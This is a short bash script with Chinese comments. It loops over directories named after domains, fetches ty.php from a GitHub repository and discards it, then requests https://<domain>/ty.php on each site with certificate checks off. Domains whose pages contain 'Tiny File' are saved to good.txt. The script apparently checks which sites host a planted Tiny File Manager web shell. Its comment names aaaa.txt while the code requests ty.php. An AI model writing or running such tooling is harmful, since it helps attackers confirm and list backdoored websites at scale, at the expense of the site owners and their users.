for dir in */; do
    dirname=${dir%/}
    echo "Checking $dirname..."
    
    # 下载文件（根据需要调整URL）
    wget -q https://github.com/arrow9hc/test2/raw/refs/heads/main/ty.php -O /dev/null 2>/dev/null
    
    # 请求 https://目录名/aaaa.txt 并检查内容
    content=$(curl -s -k "https://${dirname}/ty.php")
    
    if echo "$content" | grep -q "Tiny File"; then
        echo "$dirname" >> good.txt
        echo "  -> FOUND: $dirname (contains 'Tiny File')"
    else
        echo "  -> NOT FOUND: $dirname"
    fi
done